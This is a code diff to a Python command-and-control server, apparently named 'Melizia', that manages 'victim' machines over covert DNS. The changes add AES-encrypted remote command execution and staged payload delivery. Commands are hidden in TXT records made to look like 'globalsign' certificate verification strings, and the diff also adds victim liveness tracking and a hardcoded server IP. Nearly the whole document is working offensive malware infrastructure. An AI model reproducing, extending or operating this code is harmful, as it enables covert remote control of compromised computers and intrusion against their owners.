@@ -26,6 +26,32 @@ currentEncodedCommand = []
 console = Console()
 encodedCommandQueue = {}
 
+from Crypto.Cipher import AES
+from Crypto.Random import get_random_bytes
+from Crypto.Util.Padding import unpad
+from Crypto import Random
+
+
+def _pad(s):
+    bs = AES.block_size
+    return s + (bs - len(s) % bs) * chr(bs - len(s) % bs)
+
+@staticmethod
+def _unpad(s):
+    return s[:-ord(s[len(s)-1:])]
+
+def AESencrypt(key, raw):
+        raw = _pad(raw)
+        iv = Random.new().read(AES.block_size)
+        cipher = AES.new(key, AES.MODE_CFB, iv, segment_size=128)
+        stringEnc = cipher.encrypt(raw.encode())
+        return base64.b64encode(iv + cipher.encrypt(raw.encode()))
+
+def AESdecrypt(key, enc):
+        enc = base64.b64decode(enc)
+        iv = enc[:AES.block_size]
+        cipher = AES.new(key, AES.MODE_CFB, iv, segment_size=128)
+        return _unpad(cipher.decrypt(enc[AES.block_size:])).decode('utf-8')
 
 from dnslib import QTYPE, RR, DNSLabel, dns
 from dnslib.server import BaseResolver as LibBaseResolver, DNSServer as LibDNSServer
@@ -38,17 +64,16 @@ TYPE_LOOKUP = {
         'AAAA': (dns.AAAA, QTYPE.AAAA),
         'CAA': (dns.CAA, QTYPE.CAA),
         'CNAME': (dns.CNAME, QTYPE.CNAME),
-        'DNSKEY': (dns.DNSKEY, QTYPE.DNSKEY),                                                                                                                                                                  
-    'MX': (dns.MX, QTYPE.MX),                                                                                                                                                                              
-    'NAPTR': (dns.NAPTR, QTYPE.NAPTR),                                                                                                                                                                     
-    'NS': (dns.NS, QTYPE.NS),                                                                                                                                                                              
-    'PTR': (dns.PTR, QTYPE.PTR),                                                                                                                                                                           
-    'RRSIG': (dns.RRSIG, QTYPE.RRSIG),                                                                                                                                                                     
-    'SOA': (dns.SOA, QTYPE.SOA),                                                                                                                                                                           
-    'SRV': (dns.SRV, QTYPE.SRV),                                                                                                                                                                           
-    'TXT': (dns.TXT, QTYPE.TXT),                                                                                                                                                                           
-    'SPF': (dns.TXT, QTYPE.TXT),                                                                                                                                                                           
-}
+        'DNSKEY': (dns.DNSKEY, QTYPE.DNSKEY),
+        'MX': (dns.MX, QTYPE.MX),
+        'NAPTR': (dns.NAPTR, QTYPE.NAPTR),
+        'NS': (dns.NS, QTYPE.NS),
+        'PTR': (dns.PTR, QTYPE.PTR),
+        'RRSIG': (dns.RRSIG, QTYPE.RRSIG),
+        'SOA': (dns.SOA, QTYPE.SOA),
+        'SRV': (dns.SRV, QTYPE.SRV),
+        'TXT': (dns.TXT, QTYPE.TXT),
+        'SPF': (dns.TXT, QTYPE.TXT),                                                                                                                                                                        }
 
 
 c2Statistics = {
@@ -87,9 +112,24 @@ class Machine:
         self.Uptime = 0
         self.victimNotes = victimNotes
         self.FirstSeen = None
+        self.status = True
+        self.LastSleep = 10
+        self.AESKey = None
+
+    def change_status(self, status):
+        self.status = status
 
     def send_ping(self):
         self.pingTime = datetime.now()
+
+    def change_last_sleep(self, time):
+        self.LastSleep = time
+
+    def calculate_status(self):
+        if self.Uptime > (self.LastSleep + 2):
+            return "Dead"
+        else:
+            return "Alive"
 
     def get_uptime(self):
         uptime = 0
@@ -108,7 +148,7 @@ def generate_machine_id():
 def generate_RSA_keypair():
     private_key = rsa.generate_private_key(
         public_exponent=65537,
-        key_size=2048
+        key_size=1024
     )
     public_key = private_key.public_key()
     return (private_key, public_key)
@@ -203,10 +243,11 @@ def list_computers():
     table.add_column("Name")
     table.add_column("Uptime")
     table.add_column("First Seen")
+    table.add_column("Status")
 
     for k,v in machineClassList.items():
         table.add_row(
-        k, v.CustomName, str(v.get_uptime()), str(v.FirstSeen)
+        k, v.CustomName, str(v.get_uptime()), str(v.FirstSeen), v.calculate_status()
         )
 
     #machineClassList[userid].get_uptime()
@@ -233,6 +274,20 @@ class Utils:
                 )
         ))
         return encrypted
+
+    def RSADecrypt(self, encrypted, private_key):
+        plaintext = private_key.decrypt(
+                encrypted,
+                padding.OAEP(
+                    mgf=padding.MGF1(algorithm=hashes.SHA256()),
+                    algorithm=hashes.SHA256(),
+                    label=None
+                    )
+        )
+        return plaintext
+
+stagedPayload_cmd = False
+multiStagePayloadContent = []
 import pyotp
 class VictimPayloads:
     def __init__(self):
@@ -240,7 +295,13 @@ class VictimPayloads:
                            "info": "List computer info",
                            "back":"Return to main menu",
                            "sleep":"Hibernate victim (Usage: sleep (time in seconds))",
-                           "notes":"Add victim notes"}
+                           "notes":"Add victim notes",
+                           "migrate": "Migrate to another process (Usage: migrate (proc PID)) X",
+                           "lsproc": "List running processes X",
+                           "qinfo": "Query basic computer information, such as hostname... X",
+                           "exec": "Execute a single command on user (Usage: exec (command))",
+                           "shell": "Spawn a interactive shell on user X"
+                           }
     def notes(self, public_key_hash):
         global c2Statistics
         while True:
@@ -292,26 +353,49 @@ class VictimPayloads:
                     pass
             if command == "back":
                 break
-    
+#stagedPayload_cmd = False
+
     def MethodToPacketEncoder(self, method, public_key_hash, *args, **kwargs):
+        global stagedPayload_cmd, multiStagePayloadContent
         utils = Utils()
         match method:
             case "sleep":
-                print(kwargs)
+                currentEncodedCommand.clear()
                 sleepTime = kwargs.get('sleepTime', None)
                 console.print(f"[bold yellow][*][/bold yellow] Sent \"sleep\" command to victim, sleeping for {sleepTime} seconds...\n")
                 packet = public_key_hash + "|" + "s" + "|" + str(sleepTime)
                 print(packet)
                 ciphertext = utils.RSAEncrypt(packet.encode(), machineClassList[public_key_hash].RSA_Victim_Public_Key)
-                console.print(f"Sleep ciphertext :: {ciphertext}")
+                machineClassList[public_key_hash].change_last_sleep(int(sleepTime))
                 command_split = [ciphertext[i: i + 220] for i in range(0, len(ciphertext), 220)]
                 for x in command_split:
                     currentEncodedCommand.append(f"globalsign-dv={x.decode()}")
                 return currentEncodedCommand
 
             case "command":
-                command = kwargs.get('command', None)
+                stagedPayload_cmd = True
+
+                # Execute first stage of command execution, AES key generation and RSA encrypted deployment
+                currentEncodedCommand.clear()
+                command = kwargs.get('command', None)[1:]
+                command = ' '.join(command)
+                AESKey = machineClassList[public_key_hash].AESKey
+                AESKey_Encoded = base64.b32encode(AESKey)
+                packet = "0" + "|" + "c" + "|" + AESKey_Encoded.decode()
+                ciphertext = utils.RSAEncrypt(packet.encode(), machineClassList[public_key_hash].RSA_Victim_Public_Key)
+                command_split = [ciphertext[i: i + 220] for i in range(0, len(ciphertext), 220)]
+                for x in command_split:
+                    currentEncodedCommand.append(f"globalsign-dv={x.decode()}")
                 console.print(f"[bold yellow][*][/bold yellow] Sent \"{command}\" to victim\n")
+                packet = public_key_hash + "|" + "c" + "|" + command
+                encodedCommand = AESencrypt(machineClassList[public_key_hash].AESKey, packet)
+                for x in encodedCommand:
+                    print(int(x), end=" ")
+                b32EncodedCommand = base64.b32encode(encodedCommand).decode()
+                encodedCommand_split = [b32EncodedCommand[i: i + 220] for i in range(0, len(b32EncodedCommand), 220)]
+                for x in encodedCommand_split:
+                    multiStagePayloadContent.append(f"globalsign-xv={x}")
+                return currentEncodedCommand
 
     def ListenerToProtoSender(proto):
         print(proto)
@@ -324,11 +408,13 @@ class VictimPayloads:
         commandMode = True
         currentEncodedCommand = packet
 
-    def command(self, command):
-        global commandMode, currentEncodedCommand
-        packet = self.MethodToPacketEncoder("command", public_key_hash, sleepTime=sleepTime)
+    def command(self, command, public_key_hash):
+        global commandMode, currentEncodedCommand, stagedPayload, multiStagePayloadContent
+        multiStagePayloadContent.clear()
+        packet = self.MethodToPacketEncoder("command", public_key_hash, command=command)
         commandMode = True
         currentEncodedCommand = packet
+        
 
     def exit(self):
         return 0
@@ -360,25 +446,41 @@ def victimInteract(public_key_hash):
         victim = machineClassList[public_key_hash]
     except:
         console.print(f"[bold red][!][/bold red] Victim ID [bold blue]{public_key_hash}[/bold blue] not found!")
-        return 0
     while True:
-       issuedCommand = input(f"\n{Fore.BLUE}({machineClassList[public_key_hash].CustomName}){Style.RESET_ALL}> ").split()
-       if(issuedCommand[0] == commands[0]):
-            victimHandler.rename(public_key_hash, issuedCommand[1])
+        try:
+            issuedCommand = input(f"\n{Fore.BLUE}({machineClassList[public_key_hash].CustomName}){Style.RESET_ALL}> ").split()
+            if(issuedCommand[0] == commands[0]):
+                victimHandler.rename(public_key_hash, issuedCommand[1])
 
-       if(issuedCommand[0] == commands[1]):
-            victimHandler.info(public_key_hash)
+            if(issuedCommand[0] == commands[1]):
+                victimHandler.info(public_key_hash)
 
-       if(issuedCommand[0] == "help"):
-            victimHandler.help()
+            if(issuedCommand[0] == "help"):
+                victimHandler.help()
 
-       if(issuedCommand[0] == commands[2]):
-           break
-       if(issuedCommand[0] == commands[3]):
-           victimHandler.sleep(issuedCommand[1], public_key_hash)
-       if(issuedCommand[0] == commands[4]):
-           victimHandler.notes(public_key_hash)
+            if(issuedCommand[0] == commands[2]):
+                break
+
+            if(issuedCommand[0] == commands[3]):
+                victimHandler.sleep(issuedCommand[1], public_key_hash)
+
+            if(issuedCommand[0] == commands[4]):
+                victimHandler.notes(public_key_hash)
        
+            if(issuedCommand[0] == commands[5]):
+                console.print(f"Not implemented {commands[5]}")
+       
+            if(issuedCommand[0] == commands[6]):
+                console.print(f"Not implemented {commands[6]}")
+
+            if(issuedCommand[0] == commands[7]):
+                console.print(f"Not implemented {commands[7]}")
+
+            if(issuedCommand[0] == commands[8]):
+                victimHandler.command(issuedCommand, public_key_hash);
+        except Exception:
+           # console.print_exception(show_locals=True)
+            pass
 
 
 def getC2Statistics():
@@ -393,7 +495,8 @@ availableMainCommands = {"list_listeners":"List C2 listeners (DNS, HTTP, TCP, HT
                          "cloak":"Overwrite DNS nameserver AAAA/A to 127.0.0.1",
                          "key_provisioning":"Deny/Allow creation of new RSA public keys",
                          "delete":"Delete a specific host (RSA keys, notes and entry are destroyed; Usage: delete (UID))",
-                         "statistics":"Show C2 event statistics"}
+                         "statistics":"Show C2 event statistics",
+                         "cancel":"Cancel last command issued, ignore response"}
 dnsCloaked = False
 IP = "20.231.9.148"
 IPV6 = "0000:0000:0000:0000:0000:ffff:14e7:0994"
@@ -420,7 +523,7 @@ def DNSCloak():
 keyProvisioning = True
 generatedCertificates = []
 def command():
-    global dnsCloaked, keyProvisioning, latestVictim
+    global dnsCloaked, multiStagePayloadContent, keyProvisioning, latestVictim, commandMode, authenticatedCommand_cmd
     commands = list(availableMainCommands)
     while True:
         try:
@@ -433,10 +536,11 @@ def command():
             if(command[0]  == commands[2]):
                 get_hostname(command[1])
             if(command[0] == commands[3]):
-                if latestVictim != "":
+                if latestVictim != "" and len(command) < 2:
                     victimInteract(latestVictim)
                 else:
                     victimInteract(command[1])
+
             if(command[0] == "help"):
                 console.print(f"- [bold green]Melizia Usage[/bold green]:\n")
                 for k, v in availableMainCommands.items():
@@ -461,6 +565,11 @@ def command():
                 deleteHost(command[1])
             if(command[0] == commands[8]):
                 getC2Statistics()
+            if(command[0] == commands[9]):
+                commandMode = False
+                authenticatedCommand_cmd = False
+                multiStagePayloadContent.clear()
+                console.print("[bold blue]Canceled last command![/bold blue]")
 
         except IndexError:
             pass
@@ -484,8 +593,41 @@ def decryptRSAByPublicKey(public_key, message):
     return plaintext
 
 
+
+
+certificate = []
+
+import binascii
+def generateCertificate():
+    global dnsCloaked, generatedCertificates
+    if dnsCloaked == True:
+        return ""
+    private_key, public_key = generate_RSA_keypair()
+    privkey_str = private_key.private_bytes(
+    encoding=serialization.Encoding.PEM,
+    format=serialization.PrivateFormat.PKCS8,
+    encryption_algorithm=serialization.NoEncryption()
+    )
+
+    #print(privkey_str.decode('utf-8'))
+    public_pem = base64.b32encode(public_key.public_bytes(encoding=serialization.Encoding.PEM,format=serialization.PublicFormat.SubjectPublicKeyInfo))
+    public_pem_split = [public_pem[i: i + 220] for i in range(0, len(public_pem), 220)]
+    m = hashlib.sha256()
+    m.update(base64.b32decode(public_pem))
+    createdHashPK = m.hexdigest()
+    generatedCertificates.append({"public_key":public_key, "private_key":private_key, "hashPK":createdHashPK})
+    fakeTXTList = []
+    for x in public_pem_split:
+        fakeTXTList.append(f"globalsign-smime-dv={x.decode()}")
+    return fakeTXTList
+
+
+generatedRSAKeyUsed = False
+authenticatedCommand_cmd = False
+
 def decodeCommand(command):
-    global statistics, commandMode, generatedCertificates, latestVictim, c2Statistics
+
+    global statistics, commandMode, generatedCertificates, latestVictim, c2Statistics, generatedRSAKeyUsed, certificate, authenticatedCommand_cmd
     try:
         command = base64.b32decode(command).decode()
         command = command.split("|")
@@ -494,55 +636,99 @@ def decodeCommand(command):
             key = load_pem_public_key(certificate.encode("utf-8"), default_backend())
             for x in generatedCertificates:
                 if x["hashPK"] == command[1]:
+                    # generate victim AES key for encrypting commands
+
                     latestVictim = command[1]
+                    generatedCertificates.clear()
+                    certificate = generateCertificate()
                     c2Statistics["Latest Victim"] = latestVictim
                     c2Statistics["Total Victims"] += 1
                     machineClassList.update({command[1]:Machine("DNS", None, x["private_key"], x["public_key"], "Unknown", key)})
+                    machineClassList[command[1]].AESKey = os.urandom(16)
                     victimHash = machineClassList[command[1]].RSA_public_key_hash
                     now = datetime.now()
                     dt_string = now.strftime("%d/%m/%Y %H:%M:%S")
                     machineClassList[command[1]].FirstSeen = dt_string
-                    console.print(f"\n[bold blue]A spaceship arrived![/bold blue]\n[bold blue]\"{victimHash}\"[/bold blue] Called home!")
-                    generatedCertificates.clear()
+                    console.print(f"[bold blue]A spaceship arrived![/bold blue]\n[bold blue]\"{victimHash}\"[/bold blue] Called home!")
+                    
         if(command[0] == "2"):
-            machineClassList[command[1]].pingTime = datetime.now()
+            try:
+                machineClassList[command[1]].pingTime = datetime.now()
+            except:
+                pass
         if(command[0] == "s"):
             console.print(f"[bold blue]Spaceship {command[1]} understood the orders![/bold blue]")
             commandMode = False
+        if(command[0] == "2c"):
+            authenticatedCommand_cmd = True
+            if len(command) > 2:
+                data = AESdecrypt(machineClassList[command[1]].AESKey, command[2]).split("|")
+                console.print("\n" + data[0])
+                multiStagePayloadContent.clear()
+                authenticatedCommand_cmd = False
 
-#            console.print(f"{machineClassList[command[1]].send_ping()}")
-        #messageResponse = decryptRSAByPublicKey(command[0], command[1])
-        #showCommandResults(command[0], command[1])
-    except Exception as err:
-        print(err)
+    except Exception:
+        console.print_exception(show_locals=True)
         pass
 
 
 def dnsDataParse(packet):
+   # print(packet)
     global commandList
     regex = r"-(.*)-"
     commandEncoded = ""
     matches = re.search(regex, packet)
     metadata = str(matches.group(0)).split("-")
+    metadata = list(filter(bool, metadata))
+   # print("Metadata: ", metadata)
     commandEnumeratorList = []
-    if((len(packet)-len(matches.group(0)) + 1) >= int(metadata[2])):
-       data = packet.replace(matches.group(0), "").replace(".","")
-       commandList.append({"data":data,"order":metadata[1]})
-       from operator import itemgetter
-       newCommandList = sorted(commandList, key=itemgetter('order')) 
-       for x in newCommandList:
-           commandEnumeratorList.append(int(x['order']))
-       if(checkConsecutive(commandEnumeratorList)):
-          for x in newCommandList:
-              if "_" in x['data']:
-                 c2Statistics["Total Requests"] += 1
-                 x['data'] = x['data'].replace('_','')
-                 for y in newCommandList:
-                     commandEncoded += y['data']
-                 decodeCommand(commandEncoded)
-                 commandEnumeratorList.clear()
-                 commandList.clear()
+    if((len(packet)-len(matches.group(0)) + 1) >= int(metadata[1])):
+        # console.print(f"Data :: {packet}")
+        data = packet.replace(matches.group(0), "").replace(".","")
+#       console.print(data)
 
+        if "_" in data and int(metadata[1]) == 1 or len(metadata) < 3:
+            data = data.replace("_", "")
+            decodeCommand(data)
+            return 0
+        data = data.replace("k", "")
+        commandList.append({"data":data,"order":int(metadata[0]), "maxorder":int(metadata[2])})
+        from operator import itemgetter
+
+        # newCommandList = sorted(commandList, key=lambda k: k['order'])
+        
+        ordens = [d['order'] for d in commandList]
+        lista_ordenada = sorted(commandList, key=lambda k: k['order'])
+        ordens_ordenadas = [d['order'] for d in lista_ordenada]
+
+        consecutivos = all(x == y - 1 for x, y in zip(ordens_ordenadas, ordens_ordenadas[1:]))
+#        print(f"{consecutivos} | {ordens_ordenadas} | {lista_ordenada}")
+        if consecutivos == True:
+            dicionario_ordenado = sorted(commandList, key=lambda k: k['order'])
+            for x in dicionario_ordenado:
+                if x['order'] == x['maxorder'] or x['order']+1 == x['maxorder']:
+       #             print(dicionario_ordenado)
+                    newCommandDict = []
+                    for i, d in enumerate(dicionario_ordenado):
+                        novo_d = dict(d)
+                        novo_d['order'] = i + 1
+                        newCommandDict.append(novo_d)
+
+                    for x in newCommandDict:
+                        commandEncoded += x['data']
+        #                print(f"Recursion :: {x}")
+                        if "_" in x['data']:
+                            commandEncoded = commandEncoded.replace('_','')
+                        #commandEncoded += x['data']
+                            c2Statistics["Total Requests"] += 1
+                    #x['data'] = x['data'].replace('_','')
+         #                   print(f"Complete decode :: {commandEncoded}")
+                            commandList.clear()
+                            decodeCommand(commandEncoded)
+                            commandEnumeratorList.clear()
+                            dicionario_ordenado.clear()
+                            newCommandDict.clear()
+                            commandEncoded = ""
 
 class DomainName(str):
     def __getattr__(self, item):
@@ -572,32 +758,8 @@ records = {
     }
 
 
-import binascii
-def generateCertificate():
-    global dnsCloaked, generatedCertificates
-    if dnsCloaked == True:
-        return ""
-    private_key, public_key = generate_RSA_keypair()
-    privkey_str = private_key.private_bytes(
-    encoding=serialization.Encoding.PEM,
-    format=serialization.PrivateFormat.PKCS8,
-    encryption_algorithm=serialization.NoEncryption()
-    )   
-
-    #print(privkey_str.decode('utf-8'))
-    public_pem = base64.b32encode(public_key.public_bytes(encoding=serialization.Encoding.PEM,format=serialization.PublicFormat.SubjectPublicKeyInfo))
-    public_pem_split = [public_pem[i: i + 220] for i in range(0, len(public_pem), 220)]
-    m = hashlib.sha256()
-    m.update(base64.b32decode(public_pem))
-    createdHashPK = m.hexdigest()
-    generatedCertificates.append({"public_key":public_key, "private_key":private_key, "hashPK":createdHashPK})
-    fakeTXTList = []
-    for x in public_pem_split:
-        fakeTXTList.append(f"globalsign-smime-dv={x.decode()}")
-    return fakeTXTList
-
 def sendDNSresponse(data):
-    global keyProvisioning, commandMode, currentEncodedCommand
+    global keyProvisioning, commandMode, currentEncodedCommand, generatedRSAKeyUsed, certificate, stagedPayload_cmd, multiStagePayloadContent, authenticatedCommand_cmd
     try:
         request = DNSRecord.parse(data)
         reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
@@ -611,16 +773,20 @@ def sendDNSresponse(data):
             reply.add_answer(RR(rname=qname, rtype=QTYPE.AAAA, ttl=5, rdata=dns.AAAA(IPV6)))
         if qt == "TXT":
 #            console.print(f"Command mode :: {commandMode}")
-            if keyProvisioning == False:
+            if authenticatedCommand_cmd == True and commandMode == True:
+                reply.add_answer(RR(rname=qname, rtype=QTYPE.TXT, ttl=5, rdata=dns.TXT(multiStagePayloadContent)))
+                return reply.pack()
+		# multiStagePayloadContent.clear()
+                
+            if keyProvisioning == False and authenticatedCommand_cmd == False:
                 reply.add_answer(RR(rname=qname, rtype=QTYPE.TXT, ttl=5, rdata=dns.TXT("")))
-            if commandMode == False:
-                certificate = generateCertificate()
+            if commandMode == False and authenticatedCommand_cmd == False:
                 reply.add_answer(RR(rname=qname, rtype=QTYPE.TXT, ttl=5, rdata=dns.TXT(certificate)))
             else:
                 reply.add_answer(RR(rname=qname, rtype=QTYPE.TXT, ttl=5, rdata=dns.TXT(currentEncodedCommand)))
         return reply.pack()
-    except Exception as err:
-        print(err)
+    except:
+        #print(err)
         pass
 
 class DNSServer:
@@ -629,7 +795,7 @@ class DNSServer:
         self.port = port
         self.domain = domain
    def start(self):
-       global c2Statistics
+       global c2Statistics, certificate
        data = None
        addr = None
        try:
@@ -640,6 +806,7 @@ class DNSServer:
            console.print(f"[bold red][!][/bold red] Failed to start DNS Server\n")
            return 0
        c2Statistics["Active Listeners"].append("DNS")
+       certificate = generateCertificate()
        while True:
            try:
                data, addr = udps.recvfrom(512)
@@ -656,7 +823,8 @@ class DNSServer:
                        if(len(receivedData) > len(self.domain+".")):
                            dnsDataParse(receivedData)
                     #c2Statistics["Invalid Requests"] += 1
-           except:
+           except Exception:
+               console.print_exception(show_locals=True)
                pass
 
 import signal
